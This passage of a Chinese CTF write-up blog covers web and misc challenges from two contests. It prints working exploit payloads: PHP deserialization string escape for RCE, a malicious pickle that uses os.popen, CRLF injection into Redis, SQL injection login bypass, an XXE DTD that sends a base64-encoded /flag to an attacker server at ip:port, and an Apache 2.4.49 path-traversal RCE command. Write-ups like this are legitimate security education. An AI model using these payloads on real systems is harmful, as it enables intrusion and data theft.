class="hljs-keyword">import</span> Flask, render_template, request, redirect, url_for, session<br><span class="hljs-keyword">from</span> flask_login <span class="hljs-keyword">import</span> LoginManager, UserMixin, login_user, login_required, logout_user, current_user<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;welcome_to_here&#x27;</span>  <span class="hljs-comment"># 修改为一个随机的密钥</span><br><br><span class="hljs-comment"># 初始化 Flask-Login</span><br>login_manager = LoginManager()<br>login_manager.init_app(app)<br>login_manager.login_view = <span class="hljs-string">&#x27;login&#x27;</span><br><br><span class="hljs-comment"># 模拟一个用户类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">UserMixin</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span></span>):<br>        self.<span class="hljs-built_in">id</span> = <span class="hljs-built_in">id</span><br><br><span class="hljs-comment"># 模拟用户数据库</span><br>users = &#123;<span class="hljs-string">&#x27;user_id&#x27;</span>: &#123;<span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;user_password&#x27;</span>, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;user&#x27;</span>&#125;, <span class="hljs-string">&#x27;admin_id&#x27;</span>: &#123;<span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;asdfghjkl&#x27;</span>, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>&#125;&#125;<br><br><span class="hljs-meta">@login_manager.user_loader</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_user</span>(<span class="hljs-params">user_id</span>):<br>    <span class="hljs-keyword">return</span> User(user_id)<br><br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        user_data = users.get(username)<br>        <span class="hljs-keyword">if</span> user_data <span class="hljs-keyword">and</span> user_data.get(<span class="hljs-string">&#x27;password&#x27;</span>) == password:<br>            user = User(username)<br>            login_user(user)<br><br>            <span class="hljs-comment"># 在登录成功后将用户的角色信息存储在 session 中</span><br>            session[<span class="hljs-string">&#x27;role&#x27;</span>] = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin_id&#x27;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;user&#x27;</span><br><br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-meta">@login_required</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():<br>    logout_user()<br>    session.pop(<span class="hljs-string">&#x27;role&#x27;</span>, <span class="hljs-literal">None</span>)  <span class="hljs-comment"># 清除 session 中的角色信息</span><br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-meta">@login_required</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    results = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        a = request.form[<span class="hljs-string">&#x27;text&#x27;</span>]<br>        <span class="hljs-comment"># 创建一个 StringIO 对象以捕获输出</span><br>        output = io.StringIO()<br>        <span class="hljs-comment"># 将 base64 编码的数据解码并进行 disassembly，输出重定向到 StringIO 对象</span><br>        <span class="hljs-keyword">try</span>:<br>            decoded_data = base64.b64decode(a)<br>            pickle.loads(decoded_data)<br><br>            <span class="hljs-comment"># 使用 context manager 重定向标准输出</span><br>            <span class="hljs-keyword">with</span> io.StringIO() <span class="hljs-keyword">as</span> file:<br>                old_stdout = sys.stdout<br>                sys.stdout = file<br>                <span class="hljs-keyword">try</span>:<br>                    pickletools.dis(decoded_data)<br>                <span class="hljs-keyword">finally</span>:<br>                    sys.stdout = old_stdout<br>                results = file.getvalue()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            results = <span class="hljs-built_in">str</span>(e)<br><br>            <span class="hljs-comment"># 渲染模板并传递 results 变量</span><br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, results=results)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 如果不是 POST 请求，则正常渲染 index.html</span><br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br><br>        <span class="hljs-comment"># 检查用户名是否已存在</span><br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;用户名已存在，请选择其他用户名&quot;</span><br><br>        <span class="hljs-comment"># 创建新用户</span><br>        users[username] = &#123;<span class="hljs-string">&#x27;password&#x27;</span>: password, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;user&#x27;</span>&#125;<br><br>        <span class="hljs-comment"># 登录新用户</span><br>        user = User(username)<br>        login_user(user)<br><br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.config[<span class="hljs-string">&#x27;SESSION_COOKIE_NAME&#x27;</span>] = <span class="hljs-string">&#x27;session&#x27;</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>,debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><h3 id="逃跑大师"><a href="#逃跑大师" class="headerlink" title="逃跑大师"></a>逃跑大师</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>highlight_file(__FILE__);<br>error_reporting(<span class="hljs-number">0</span>);<br>function substrstr($data)<br>&#123;<br>    $start = mb_strpos($data, <span class="hljs-string">&quot;[&quot;</span>);<br>    $end = mb_strpos($data, <span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">return</span> mb_substr($data, $start, $end + <span class="hljs-number">1</span> - $start);<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    public $A;<br>    public $B = <span class="hljs-string">&quot;HELLO&quot;</span>;<br>    public $C = <span class="hljs-string">&quot;!!!&quot;</span>;<br>    public function __construct($A)&#123;<br>        $this-&gt;A = $A;<br>    &#125;<br>    public function __destruct()&#123;<br>        $key = substrstr($this-&gt;B . <span class="hljs-string">&quot;[welcome sdpcsec&quot;</span> .$this-&gt;C . <span class="hljs-string">&quot;]&quot;</span>);<br>        echo $key;<br>        <span class="hljs-built_in">eval</span>($key);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(isset($_POST[<span class="hljs-string">&#x27;escape&#x27;</span>])) &#123;<br>    $Class = new A($_POST[<span class="hljs-string">&#x27;escape&#x27;</span>]);<br>    $Key = serialize($Class);<br>    $K = str_replace(<span class="hljs-string">&quot;SDPCSEC&quot;</span>, <span class="hljs-string">&quot;SanDieg0&quot;</span>, $Key);<br>    unserialize($K);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    echo <span class="hljs-string">&quot;nonono&quot;</span>;<br>&#125; nonono<br></code></pre></td></tr></table></figure><p>rce在eval($key);<br>要控制变量key<br><code>$key = substrstr($this-&gt;B . &quot;[welcome sdpcsec&quot; .$this-&gt;C . &quot;]&quot;);</code><br>这里<br>序列化之后有<code>$K = str_replace(&quot;SDPCSEC&quot;, &quot;SanDieg0&quot;, $Key);</code>明显字符串逃逸<br><code>SDPCSEC</code>-&gt;<code>SanDieg0</code>长度+1<br><code>substrstr</code>根据<code>[</code>和<code>]</code>来截取<br>这里当bc可控时     <code>public $B = &quot;]111111111111111111[phpinfo()];&quot;;</code><br><code> public $C = &quot;1</code><br>经过拼接key变成了<code>]111111111111111111[phpinfo()];[welcome sdpcsec1]</code><br>而<code>mb_substr</code>截取的是19-&gt;-18 即<code>phpinfo()</code><br><img src="/mdimg/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/1715658319577-91a86fc9-b9dc-47ce-afea-79f34d6c1ba5.png"><br>这样可以保证每次截取的都是[]的内容，即可在里面rce<br>对于<br><code>O:1:&quot;A&quot;:3:&#123;s:1:&quot;A&quot;;s:1:&quot;S&quot;;s:1:&quot;B&quot;;s:39:&quot;]111111111111111111[system(&#39;cat /f*&#39;)];&quot;;s:1:&quot;C&quot;;s:1:&quot;1&quot;;&#125;</code><br>要逃逸出<code>&quot;;s:1:&quot;B&quot;;s:39:&quot;]111111111111111111[system(&#39;cat /f*&#39;)];&quot;;s:1:&quot;C&quot;;s:1:&quot;1&quot;;&#125;</code>74个字符<br>拼接4个<code>SDPCSEC</code>即可<br><code>escape=SDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSECSDPCSEC&quot;;s:1:&quot;B&quot;;s:39:&quot;]111111111111111111[system(&#39;cat /f*&#39;)];&quot;;s:1:&quot;C&quot;;s:1:&quot;1&quot;;&#125;</code><br><img src="/mdimg/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/1715659624631-0b2e9f9c-5fab-4ec2-89cd-9adcd7a14438.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024年高校网络安全管理运维赛——实践能力赛</title>
    <link href="/2024/05/07/2024%E5%B9%B4%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E2%80%94%E2%80%94%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B/"/>
    <url>/2024/05/07/2024%E5%B9%B4%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B%E2%80%94%E2%80%94%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p> <a href="https://codeload.github.com/J-0k3r/1/zip/refs/heads/main">misc附件</a></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="phpsql"><a href="#phpsql" class="headerlink" title="phpsql"></a>phpsql</h3><p>登录页面，密码输入单引号会报错，密码处存在sql注入<br>测试了一下，过滤了空格<br><code>admin</code><br><code>&#39;or&#39;&#39;=&#39;</code><br>登录<br><img src="/mdimg/2024yw/1715065549182-53c222a1-20be-4a68-8418-85d420fe1420.jpeg"></p><h3 id="pyssrf"><a href="#pyssrf" class="headerlink" title="pyssrf"></a>pyssrf</h3><p>嗷，我的上帝，怎么还会有人在用python:3.7.1。flag文件位置：/flag<br>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request <br><span class="hljs-keyword">from</span> redis <span class="hljs-keyword">import</span> Redis <br><span class="hljs-keyword">import</span> hashlib <br><span class="hljs-keyword">import</span> pickle <br><span class="hljs-keyword">import</span> base64 <br><span class="hljs-keyword">import</span> urllib <br>app = Flask(__name__) <br>redis = Redis(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">6379</span>) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_result</span>(<span class="hljs-params">url</span>): <br>    url_key=hashlib.md5(url.encode()).hexdigest() <br>    res=redis.get(url_key) <br>    <span class="hljs-keyword">if</span> res: <br>        <span class="hljs-keyword">return</span> pickle.loads(base64.b64decode(res))<br>    <span class="hljs-keyword">else</span>: <br>        <span class="hljs-keyword">try</span>: <br>            <span class="hljs-built_in">print</span>(url) <br>            info = urllib.request.urlopen(url) <br>            res = info.read() <br>            pickres=pickle.dumps(res) <br>            b64res=base64.b64encode(pickres) <br>            redis.<span class="hljs-built_in">set</span>(url_key,b64res,ex=<span class="hljs-number">300</span>) <br>            <span class="hljs-keyword">return</span> res <br>        <span class="hljs-keyword">except</span> urllib.error.URLError <span class="hljs-keyword">as</span> e: <br>            <span class="hljs-built_in">print</span>(e) @app.route(<span class="hljs-string">&#x27;/&#x27;</span>) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>(): <br>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>) <br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;%s &#x27;&#x27;&#x27;</span> % get_result(<span class="hljs-string">&#x27;http://&#x27;</span>+url).decode(encoding=<span class="hljs-string">&#x27;utf8&#x27;</span>,errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/source&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>(): <br>    <span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><p>这里把url的md5当键名保存在redis，这里pickle.loads有反序列化漏洞，构造恶意pickle序列化的内容然后存入redis，当redis里缓存了之后再次访问就会触发pickle.loads反序列化</p><p>找urllib.request.urlopen的漏洞可以找到<a href="https://cloud.tencent.com/developer/article/1582092">https://cloud.tencent.com/developer/article/1582092</a></p><p>用crlf可以注入到redis</p><p>这里先获取redis的url来当key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>key=hashlib.md5(<span class="hljs-string">&quot;http://127.0.0.1:6379&quot;</span>.encode()).hexdigest()<br><span class="hljs-built_in">print</span>(key)<br><span class="hljs-comment">#cbdecc92165b29374b6b62cca016d4f8</span><br></code></pre></td></tr></table></figure><p>这里开了debug可以利用报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> requests <span class="hljs-keyword">import</span> Request, Session<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>, (<span class="hljs-string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;tac /flag&#x27;).read())&quot;</span>,))<br><br>a = A()<br>a = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(base64.b64encode(a))<br><span class="hljs-comment">#b&#x27;gASVVwAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw7cmFpc2UgRXhjZXB0aW9uKF9faW1wb3J0X18oJ29zJykucG9wZW4oJ3RhYyAvZmxhZycpLnJlYWQoKSmUhZRSlC4=&#x27;</span><br></code></pre></td></tr></table></figure><p>payload</p><p><code>?url=127.0.0.1:6379?%0D%0Aset%20cbdecc92165b29374b6b62cca016d4f8%20gASVVwAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw7cmFpc2UgRXhjZXB0aW9uKF9faW1wb3J0X18oJ29zJykucG9wZW4oJ3RhYyAvZmxhZycpLnJlYWQoKSmUhZRSlC4=%0D%0Apadding</code></p><p><img src="/mdimg/2024yw/1715083904469-d5bde336-3c85-435c-84e7-592e0b982d40.png"></p><p><img src="/mdimg/2024yw/1715084049982-4cd5a240-7546-459a-9e15-b5f1cb135935.png"></p><h3 id="fileit"><a href="#fileit" class="headerlink" title="fileit"></a>fileit</h3><p>flag保存在根目录的flag文件中</p><p>源码注释</p><!-- $creds = simplexml_import_dom($dom); --><p>xxe，没回显</p><p>vps起一个python http.server</p><p>1.dtd</p><p><code>&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://ip:port/?f=%file;&#39;&gt;&quot;&gt;</code></p><p>payload</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span>[</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://ip:port/1.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%dtd;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%all;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%send;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/2024yw/1715085954898-fdab07ef-8850-485c-92a3-bfe8b8b42b25.png"></p><p><img src="/mdimg/2024yw/1715086004161-30636a0c-18c9-40b5-9658-57295080a979.png"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>逐帧提取 然后解rot13<br><img src="/mdimg/2024yw/1715066360969-d5b67cff-67be-4570-880c-3249ba9714df.jpeg"></p><h3 id="钓鱼邮件识别"><a href="#钓鱼邮件识别" class="headerlink" title="钓鱼邮件识别"></a>钓鱼邮件识别</h3><p><img src="/mdimg/2024yw/1715066412525-deda819b-3f41-4c0e-b68c-7ca2a76b4bab.jpeg"><br><img src="/mdimg/2024yw/1715066419007-fcf0189c-7708-46e8-927c-4bafe490e09e.jpeg"><br><code>flag&#123;WElcoMEto&#125;</code><br><img src="/mdimg/2024yw/1715066435790-18822c32-281b-452a-8cd2-172fe1cd4e7e.jpeg"><br><code>flag&#123;PhIshhuntInG&#125;</code><br><img src="/mdimg/2024yw/1715066449097-c3f1893f-2574-473b-b753-831bbb15e37f.jpeg"><br><img src="/mdimg/2024yw/1715066456790-8d9f714e-5d58-4301-b5aa-854c396a3943.jpeg"><br><code>&#123;N0wY0u</code><br><img src="/mdimg/2024yw/1715066473283-5ad1698c-9af9-444d-b4a7-541ed4435917.jpeg"><br><code>_Kn0wH0wt0_</code><br><img src="/mdimg/2024yw/1715066494047-75b52fec-85a4-4ac0-8fa6-fe53e58c25d0.jpeg"><br><code>ANAlys1sDNS&#125;</code><br><code>flag&#123;N0wY0u_Kn0wH0wt0_ANAlys1sDNS&#125;</code></p><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p><img src="/mdimg/2024yw/15622d47-847a-4799-b7a2-cb10cb79e43e.jpg"></p><p>附件有一个dockerfile 显示的是apache 2.4.49版本，发现一个rce漏洞</p><p><img src="/mdimg/2024yw/28d926d9-4e95-4f87-a29c-a156c8138bc7.png"></p><p><a href="https://www.freebuf.com/articles/web/293172.html">https://www.freebuf.com/articles/web/293172.html</a><br><img src="/mdimg/2024yw/1715066537536-17358bca-326d-4887-86ee-6afe9ee55c63.jpeg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">curl -X POST <span class="hljs-string">&quot;靶机url/nc&quot;</span> -d <span class="hljs-string">&quot;port=80&amp;data=POST%20/cgi-bin/.%252e/.%252e/.%252e/.%252e/bin/sh%20HTTP/1.1%0D%0AHost:%20127.0.0.1:80%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0AContent-Length:%2014%0D%0AConnection:%20close%0D%0A%0D%0Aecho;cat%20/flag&quot;</span><br></code></pre></td></tr></table></figure><h3 id="Gateway"><a href="#Gateway" class="headerlink" title="Gateway"></a>Gateway</h3><p><img src="/mdimg/2024yw/1715066558857-6753dc7c-1330-4b46-b51e-c3b04d1f5a2f.jpeg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">106</span>&amp;<span class="hljs-number">112</span>&amp;<span class="hljs-number">101</span>&amp;<span class="hljs-number">107</span>&amp;<span class="hljs-number">127</span>&amp;<span class="hljs-number">101</span>&amp;<span class="hljs-number">104</span>&amp;<span class="hljs-number">49</span>&amp;<span class="hljs-number">57</span>&amp;<span class="hljs-number">56</span>&amp;<span class="hljs-number">53</span>&amp;<span class="hljs-number">56</span>&amp;<span class="hljs-number">54</span>&amp;<span class="hljs-number">56</span>&amp;<span class="hljs-number">49</span>&amp;<span class="hljs-number">51</span>&amp;<span class="hljs-number">51</span>&amp;<span class="hljs-number">105</span>&amp;<span class="hljs-number">56</span>&amp;<span class="hljs-number">103</span>&amp;<span class="hljs-number">106</span>&amp;<span class="hljs-number">49</span>&amp;<span class="hljs-number">56</span>&amp;<span class="hljs-number">50</span>&amp;<span class="hljs-number">56</span>&amp;<span class="hljs-number">103</span>&amp;<span class="hljs-number">102</span>&amp;<span class="hljs-number">56</span>&amp;<span class="hljs-number">52</span>&amp;<span class="hljs-number">101</span>&amp;<span class="hljs-number">104</span>&amp;<span class="hljs-number">102</span>&amp;<span class="hljs-number">105</span>&amp;<span class="hljs-number">53</span>&amp;<span class="hljs-number">101</span>&amp;<span class="hljs-number">53</span>&amp;<span class="hljs-number">102</span>&amp;<span class="hljs-number">129</span>&amp;<br></code></pre></td></tr></table></figure><p>Ascii然后凯撒<br><img src="/mdimg/2024yw/1715066576146-ed45c1f9-9bf6-4137-b30f-5cf5e95350c9.jpeg"><br><code>flag&#123;ad1985868133e8cf1828cb84adbe5a5b&#125;</code></p><h3 id="f-or-r"><a href="#f-or-r" class="headerlink" title="f or r"></a>f or r</h3><p>参考<a href="https://qanux.github.io/2024/04/22/geek2024/index.html">https://qanux.github.io/2024/04/22/geek2024/index.html</a><br>下载下面版本的curl<br>magnet:?xt=urn:btih:f98cc874544405d3f4598637df263d0b0431eb2a&amp;dn=zh-cn_windows_10_business_editions_version_22h2_updated_april_2024_x64_dvd_a2873093.iso&amp;xl=6433263616<br><img src="/mdimg/2024yw/1715066604570-998dd29b-c202-46a1-b87b-28c8273be1b3.jpeg"><br>进入到这个amd的目录，把里面的curl.exe和里面复制出来，把r文件夹里面的curl.exe覆盖到题目的r文件夹<br><img src="/mdimg/2024yw/1715066616222-c3698872-a902-49d4-b355-ccf73564bb18.jpeg"><br><code>flag&#123;dc1d03c554150acedca6d71ce394&#125;</code></p><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><p>程序把队伍token当压缩包密码用，但是压缩包密码要和token相同，又不能超过64个字符，否则会导致压缩失败，所以取token的前64个字符就可以了。<br>由于flag不在根目录，要从tmp/flag压缩之后再解压到根目录才能读取<br>而程序实现flag的打印逻辑也有问题：输入的是flag{，后面无论是什么内容都能通过进而打印flag<br>现在要实现的是：既要使得压缩包能用正确密码（token前64位）解压，又要能绕过flag验证，即密码开头必须是flag{才能打印<br>看似矛盾，但由于压缩过程是开了一个tty终端，所以可以用DEL控制字符实现： 输入flag{，然后再把这几个字符删了，再输入token</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>file = <span class="hljs-string">&#x27;./myzip&#x27;</span><br>elf = ELF(file)<br><span class="hljs-comment"># p = process(file)</span><br>lk = <span class="hljs-string">&#x27;prob03.contest.pku.edu.cn 10003&#x27;</span>.split()<br>p = remote(lk[<span class="hljs-number">0</span>], lk[<span class="hljs-number">1</span>])<br><br>token = <span 